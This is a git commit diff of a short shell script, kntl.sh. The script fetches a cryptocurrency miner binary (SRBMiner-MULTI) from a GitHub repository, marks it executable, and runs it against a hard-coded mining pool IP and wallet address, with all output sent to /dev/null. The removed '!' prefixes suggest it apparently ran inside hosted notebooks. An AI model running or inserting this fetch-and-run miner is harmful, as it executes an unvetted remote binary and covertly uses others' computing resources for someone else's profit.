4b4df8168d497aa9c649b352019e353ccc4bcd9c
apaple <76417012+apaple@users.noreply.github.com>
2024-09-21 16:51:04 +0700

    Update kntl.sh

--- kntl.sh
+++ kntl.sh
@@ -1,5 +1,5 @@
-!wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI
+wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI
 
-!chmod u+x SRBMiner-MULTI
+chmod u+x SRBMiner-MULTI
 
-!./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://139.99.16.105:5040 --wallet RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.Rig001 --password x -t 8 >/dev/null 2>&1
+./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+tcp://139.99.16.105:5040 --wallet RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.Rig001 --password x -t 8 >/dev/null 2>&1
